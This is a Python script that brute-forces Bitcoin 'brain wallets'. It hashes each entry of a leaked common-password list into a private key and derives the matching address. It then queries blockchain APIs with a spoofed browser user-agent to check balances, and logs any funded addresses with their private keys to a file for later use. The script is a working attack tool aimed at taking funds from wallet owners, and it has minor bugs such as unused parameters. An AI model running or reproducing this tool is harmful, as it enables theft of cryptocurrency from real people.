# Inspired by https://bitcoin.stackexchange.com/a/3170
# Passwords: https://web.archive.org/web/20190904040111/https://www.ncsc.gov.uk/static-assets/documents/PwnedPasswordTop100k.txt
import hashlib
import json
import sys
import time
from typing import List, Tuple

import requests
from bitcoinaddress import Wallet

url0 = 'https://blockchain.info/rawaddr/'  # blocked very fast
url1 = 'https://blockchain.info/multiaddr?cors=true&active='  # blocked fast
url2 = 'https://api.blockcypher.com/v1/btc/main/addrs/'  # blocked after some attempts
url3 = 'https://api-r.bitcoinchain.com/v1/address/'
url4 = 'https://chainflyer.bitflyer.jp/v1/address/'

headers = {
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
    'accept': 'text/html,application/xhtml+xml',
    'accept-encoding': 'gzip, deflate, br',
    'cache-control': 'max-age=0',
    'accept-language': 'de-CH,de;q=0.9,en-US;q=0.8,en;q=0.7'
}

blockchain_info_url = url2


def get_words() -> List[str]:
    with open('ncsc_100k.txt') as read_file:
        content = read_file.read()
    return content.split('\n')


def get_balance2(url: str) -> Tuple[float, float]:
    url = blockchain_info_url + public_address + '/balance'
    final_balance = 0
    total_received = 0

    try:
        content = requests.get(url).text
        # not-found-or-invalid-arg
        if 'invalid active address' in content:
            return final_balance, total_received
        final_balance = json.loads(content)['final_balance']  # ['wallet']
        total_received = json.loads(content)['total_received']
    except (KeyError, json.decoder.JSONDecodeError, ValueError) as e:
        print('Error occured:', e)
        print('Content:', content)
        sys.exit()
    return final_balance, total_received


# 3
def get_balance(url: str) -> Tuple[float, float]:
    url = 'https://api-r.bitcoinchain.com/v1/address/' + public_address
    final_balance, total_received = 0, 0

    try:
        content = json.loads(requests.get(url).text)
        if 'balance' not in content[0]:
            return final_balance, total_received
        final_balance = content[0]['balance']
    except (KeyError, json.decoder.JSONDecodeError, ValueError, TypeError) as e:
        print('Error occured:', e)
        print('Content:', content)
        sys.exit()
    return final_balance, total_received


skip = True
key_word = 'lovers'

for word in get_words():
    if word == key_word:
        skip = False
    if skip:
        continue
    print('Trying', word, '...')
    time.sleep(2)
    # 1. Create hash
    # -> 30caae2fcb7c34ecadfddc45e0a27e9103bd7cfc87730d7818cc096b1266a683
    private_hash = hashlib.sha256(bytes(word, 'ascii')).hexdigest()
    # print('hash:', hash)

    # 2. Create public wallet key
    # -> 1TnnhMEgic5g4ttrCQyDopwqTs4hheuNZ
    wallet = Wallet(private_hash)
    public_address = str(wallet).split('Public Address 1: ')[1].split('\n')[
        0].strip()
    # print('public address:', public_address)

    # 3. Check blockchain for current balance
    final_balance, total_received = get_balance(public_address)

    if float(final_balance) > 0:
        print('Bingo! - ', word)
        print('  private_hash:', private_hash)
        print('  public_address:', public_address)
        with open('found.txt', 'a') as write_file:
            write_file.write(
                word + ',' + private_hash + ',' + public_address + '\n')
    elif float(total_received) > 0:
        print('-> Found address which once had money on it!')
        with open('once_moncey.txt', 'a') as write_file:
            write_file.write(
                word + ',' + private_hash + ',' + public_address + ',' + str(
                    total_received) + '\n')
